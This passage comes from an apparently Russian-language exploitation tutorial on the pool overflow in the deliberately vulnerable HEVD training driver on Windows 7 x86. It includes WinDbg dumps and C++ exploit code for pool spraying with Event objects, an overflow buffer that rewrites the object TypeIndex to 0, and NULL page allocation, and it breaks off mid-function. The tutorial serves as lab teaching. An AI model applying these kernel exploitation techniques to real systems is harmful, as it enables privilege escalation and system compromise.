      <span class="o">+</span><span class="mh">0x03c</span> <span class="nx">DeleteProcedure</span>  <span class="p">:</span> <span class="p">(</span><span class="kc">null</span><span class="p">)</span> 
      <span class="o">+</span><span class="mh">0x040</span> <span class="nx">ParseProcedure</span>   <span class="p">:</span> <span class="p">(</span><span class="kc">null</span><span class="p">)</span> 
      <span class="o">+</span><span class="mh">0x044</span> <span class="nx">SecurityProcedure</span> <span class="p">:</span> <span class="mh">0x8288532c</span> 
      <span class="o">+</span><span class="mh">0x048</span> <span class="nx">QueryNameProcedure</span> <span class="p">:</span> <span class="p">(</span><span class="kc">null</span><span class="p">)</span> 
      <span class="o">+</span><span class="mh">0x04c</span> <span class="nx">OkayToCloseProcedure</span> <span class="p">:</span> <span class="p">(</span><span class="kc">null</span><span class="p">)</span> 
   <span class="o">+</span><span class="mh">0x078</span> <span class="nx">TypeLock</span>         <span class="p">:</span> <span class="nx">_EX_PUSH_LOCK</span>
      <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Locked</span>           <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Waiting</span>          <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Waking</span>           <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x000</span> <span class="nx">MultipleShared</span>   <span class="p">:</span> <span class="mi">0</span><span class="nx">y0</span>
      <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Shared</span>           <span class="p">:</span> <span class="mi">0</span><span class="nf">y0000000000000000000000000000 </span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
      <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Value</span>            <span class="p">:</span> <span class="mi">0</span>
      <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Ptr</span>              <span class="p">:</span> <span class="p">(</span><span class="kc">null</span><span class="p">)</span> 
   <span class="o">+</span><span class="mh">0x07c</span> <span class="nx">Key</span>              <span class="p">:</span> <span class="mh">0x6e657645</span>
   <span class="o">+</span><span class="mh">0x080</span> <span class="nx">CallbackList</span>     <span class="p">:</span> <span class="nx">_LIST_ENTRY</span> <span class="p">[</span> <span class="mh">0x84f60498</span> <span class="o">-</span> <span class="mh">0x84f60498</span> <span class="p">]</span>
      <span class="o">+</span><span class="mh">0x000</span> <span class="nx">Flink</span>            <span class="p">:</span> <span class="mh">0x84f60498</span> 
      <span class="o">+</span><span class="mh">0x004</span> <span class="nx">Blink</span>            <span class="p">:</span> <span class="mh">0x84f60498</span> 
</code></pre></div></div>

<p>По оффсет 0x28 находится структура TypeInfo. Один из её членов ClosePorcedure по оффсету 0x38. Начиная с оффсета 0x0, на который ссылается указатель OBJECT_TYPE, который мы нашли в таблице, CloseProcedure находится по 0x28 + 0x38 = 0x60. ЭТО указатель на функцию, которая будет вызвана при вызове CloseHandle, чтобы освободить Event Objects из невыгружаемого пула памяти. Это наша цель</p>

<p><img src="/assets/post_images/9.png" alt="Pool attack structure" /></p>

<p>Когда мы особождаем чанк с помощью CloseHandle, ядро идёт по адресу, на который ссылается значение массива по индексу 0xC и ищет по оффсету 0x60 указатель на функцию, вызывая её.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="nx">nt</span><span class="o">!</span><span class="nx">ObTypeIndexTable</span>
<span class="mi">82761</span><span class="nx">ee0</span>  <span class="mi">00000000</span> <span class="nx">bad0b0b0</span> <span class="mi">84</span><span class="nx">ec7860</span> <span class="mi">84</span><span class="nx">ec7798</span>
</code></pre></div></div>
<p>Первый указатель - это 0x0 и мы из <a href="https://h0mbre.github.io/HEVD_NULLPointerDereference_32bit/#">ещё не сделанный урок</a> знаем, что мы можем мапить NULL страницу в Windows 7 x86. Итак, благодаря вышеупомянутым блогерам, наш дальнейший путь ясен. Мы корраптим только значение 0xC внутри OBJECT_HEADER, чтобы вместо него было установлено 0x0. Все остальное мы оставим как есть с помощью перезаписи. Таким образом, когда мы освободим этот кусок, ядро начнет искать смещение 0x60 для указателя функции с 0x000000. Поэтому мы просто отобразим страницу NULL и поместим указатель на наш шеллкод по смещению 0x60.</p>

<h2 id="выполняем-план"><a href="#header-2"></a>Выполняем план</h2>

<p>Делаем дыры в блоке, чтобы наш буфер расположился там между Event Objects. Мы знаем, что для 0x200 дырки наш нужно освободить 8 объектов, следуя @FuzzySec будем освобождать 8 хендлов Event Objects каждые 0x16 хендлов в нашем векторе.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;vector&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="cp">#define DEVICE_NAME         "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL               0x22200F
</span>
<span class="n">vector</span><span class="o">&lt;</span><span class="n">HANDLE</span><span class="o">&gt;</span> <span class="n">defragment_handles</span><span class="p">;</span>
<span class="n">vector</span><span class="o">&lt;</span><span class="n">HANDLE</span><span class="o">&gt;</span> <span class="n">sequential_handles</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

    <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span>
        <span class="n">FILE_READ_ACCESS</span> <span class="o">|</span> <span class="n">FILE_WRITE_ACCESS</span><span class="p">,</span>
        <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
        <span class="n">FILE_FLAG_OVERLAPPED</span> <span class="o">|</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] No handle to HackSysExtremeVulnerableDriver</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Grabbed handle to HackSysExtremeVulnerableDriver: "</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">hFile</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>





    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Spraying pool to defragment...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">HANDLE</span> <span class="n">result</span> <span class="o">=</span> <span class="n">CreateEvent</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">L""</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Error allocating Event Object during defragmentation</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">defragment_handles</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Defragmentation spray complete.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Spraying sequential allocations...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">HANDLE</span> <span class="n">result</span> <span class="o">=</span> <span class="n">CreateEvent</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">L""</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Error allocating Event Object during sequential.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">sequential_handles</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Sequential spray complete.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Poking 0x200 byte-sized holes in our sequential allocation...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sequential_handles</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mh">0x16</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">x</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">BOOL</span> <span class="n">freed</span> <span class="o">=</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">sequential_handles</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">x</span><span class="p">]);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">freed</span> <span class="o">==</span> <span class="nb">false</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Unable to free sequential allocation!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Last error: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Holes poked lol.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>





    <span class="n">ULONG</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="mh">0x1F8</span><span class="p">;</span>

    <span class="n">LPVOID</span> <span class="n">input_buff</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span>
        <span class="n">payload_len</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">,</span>
        <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span>
        <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">input_buff</span><span class="p">,</span> <span class="sc">'\x41'</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>

    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[&gt;] Sending buffer size of: "</span> <span class="o">&lt;&lt;</span> <span class="n">dec</span> <span class="o">&lt;&lt;</span> <span class="n">payload_len</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="n">DWORD</span> <span class="n">bytes_ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span>
        <span class="n">IOCTL</span><span class="p">,</span>
        <span class="n">input_buff</span><span class="p">,</span>
        <span class="n">payload_len</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">bytes_ret</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] DeviceIoControl failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Вернёмся к чуть ранее показанному дампу</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pool</span> <span class="mh">0x8513C8C8</span>
<span class="nx">Pool</span> <span class="nx">page</span> <span class="mi">8513</span><span class="nx">c8c8</span> <span class="nx">region</span> <span class="nx">is</span> <span class="nx">Unknown</span>
 <span class="mi">8513</span><span class="nx">c000</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">388</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>    <span class="mi">0</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">XSav</span>
 <span class="mi">8513</span><span class="nx">c388</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">438</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">388</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="p">....</span>
 <span class="mi">8513</span><span class="nx">c7c0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">438</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">c800</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">c840</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">c880</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
<span class="o">*</span><span class="mi">8513</span><span class="nx">c8c0</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span> <span class="o">*</span><span class="nx">Hack</span>
        <span class="nx">Owning</span> <span class="nx">component</span> <span class="p">:</span> <span class="nc">Unknown </span><span class="p">(</span><span class="nx">update</span> <span class="nx">pooltag</span><span class="p">.</span><span class="nx">txt</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cac0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cb00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cb40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cb80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cbc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cc00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cc40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cc80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">ccc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cd00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cd40</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cd80</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">cdc0</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">ce00</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">8513</span><span class="nx">ce40</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">1</span><span class="nx">c0</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="nx">Even</span>

</code></pre></div></div>

<p>Наш аллокцированный чанк лежит ровно между объектами, которые мы сами создали</p>

<h2 id="портим-память"><a href="#header-2"></a>Портим память</h2>

<p>Теперь, когда мы контролируем пул с достаточно предсказуемой манере, время перезаписать тут индекс и изменить его на 0x0 с 0xC. Всё остальное между нашей 0x200 аллокацией и этим байтом должно остаться таким же, иначе БСОД.</p>

<p>Давайте просто воспользуемся командой dd, чтобы сдампить 32 значения DWORD из начала Event Objects сразу после нашего буфера ядра.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="mi">8513</span><span class="nx">cac0</span>
<span class="nx">ReadVirtual</span><span class="p">:</span> <span class="mi">8513</span><span class="nx">cac0</span> <span class="nx">not</span> <span class="nx">properly</span> <span class="nx">sign</span> <span class="nx">extended</span>
<span class="mi">8513</span><span class="nx">cac0</span>  <span class="mi">04080040</span> <span class="nx">ee657645</span> <span class="mi">00000000</span> <span class="mi">00000040</span>
<span class="mi">8513</span><span class="nx">cad0</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000001</span> <span class="mi">00000001</span>
<span class="mi">8513</span><span class="nx">cae0</span>  <span class="mi">00000000</span> <span class="mi">0008000</span><span class="nx">c</span> <span class="mi">86</span><span class="nx">e7f640</span> <span class="mi">00000000</span>
<span class="mi">8513</span><span class="nx">caf0</span>  <span class="nx">ff040001</span> <span class="mi">00000000</span> <span class="mi">8513</span><span class="nx">caf8</span> <span class="mi">8513</span><span class="nx">caf8</span>
<span class="mi">8513</span><span class="nx">cb00</span>  <span class="mi">04080008</span> <span class="nx">ee657645</span> <span class="mi">00000000</span> <span class="mi">00000040</span>
<span class="mi">8513</span><span class="nx">cb10</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000001</span> <span class="mi">00000001</span>
<span class="mi">8513</span><span class="nx">cb20</span>  <span class="mi">00000000</span> <span class="mi">0008000</span><span class="nx">c</span> <span class="mi">86</span><span class="nx">e7f640</span> <span class="mi">00000000</span>
<span class="mi">8513</span><span class="nx">cb30</span>  <span class="nx">ff040001</span> <span class="mi">00000000</span> <span class="mi">8513</span><span class="nx">cb38</span> <span class="mi">8513</span><span class="nx">cb38</span>
</code></pre></div></div>

<p>Окей, нам нужно сохранить всё, как есть кроме 0xC и перезаписать этот байт нулём. Мы перезаписываем 40 байтов или 0x28, что даёт нам буфер размером 0x220</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">ULONG</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="mh">0x220</span><span class="p">;</span>

    <span class="n">BYTE</span><span class="o">*</span> <span class="n">input_buff</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span>
        <span class="n">payload_len</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">,</span>
        <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span>
        <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="n">BYTE</span> <span class="n">overwrite_payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s">"</span><span class="se">\x40\x00\x08\x04</span><span class="s">"</span>  <span class="c1">// pool header</span>
        <span class="s">"</span><span class="se">\x45\x76\x65\xee</span><span class="s">"</span>  <span class="c1">// pool tag</span>
        <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span>  <span class="c1">// obj header quota begin</span>
        <span class="s">"</span><span class="se">\x40\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span>  <span class="c1">// obj header quota end</span>
        <span class="s">"</span><span class="se">\x01\x00\x00\x00</span><span class="s">"</span>  <span class="c1">// obj header begin</span>
        <span class="s">"</span><span class="se">\x01\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x00\x00\x08\x00</span><span class="s">"</span> <span class="c1">// 0xc converted to 0x0</span>
        <span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">input_buff</span><span class="p">,</span> <span class="sc">'\x42'</span><span class="p">,</span> <span class="mh">0x1F8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">input_buff</span> <span class="o">+</span> <span class="mh">0x1F8</span><span class="p">,</span> <span class="n">overwrite_payload</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">)</span>
</code></pre></div></div>

<p>Нам нужно аллоцировать NULL страницу, что взято у <a href="https://github.com/tekwizz123/HEVD-Exploit-Solutions/blob/master/HEVD-Pool-Overflow/HEVD-Pool-Overflow/HEVD-Pool-Overflow.cpp">tekwizzz123</a></p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">_NtAllocateVirtualMemory</span><span class="p">)(</span>
    <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
    <span class="n">PVOID</span> <span class="o">*</span><span class="n">BaseAddress</span><span class="p">,</span>
    <span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
    <span class="n">PSIZE_T</span> <span class="n">AllocationSize</span><span class="p">,</span>
    <span class="n">ULONG</span> <span class="n">AllocationType</span><span class="p">,</span>
    <span class="n">ULONG</span> <span class="n">Protect</span>
<span class="p">);</span>

<span class="kt">void</span> <span class="nf">allocate_shellcode</span><span class="p">()</span> <span class="p">{</span>

    <span class="n">_NtAllocateVirtualMemory</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> 
        <span class="p">(</span><span class="n">_NtAllocateVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span>
            <span class="s">"NtAllocateVirtualMemory"</span><span class="p">);</span>

    <span class="n">INT64</span> <span class="n">address</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>

    <span class="n">HANDLE</span> <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">NtAllocateVirtualMemory</span><span class="p">(</span>
        <span class="n">GetCurrentProcess</span><span class="p">(),</span>
        <span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">address</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="p">(</span><span class="n">PSIZE_T</span><span class="p">)</span><span class="o">&amp;</span><span class="n">size</span><span class="p">,</span>
        <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
        <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

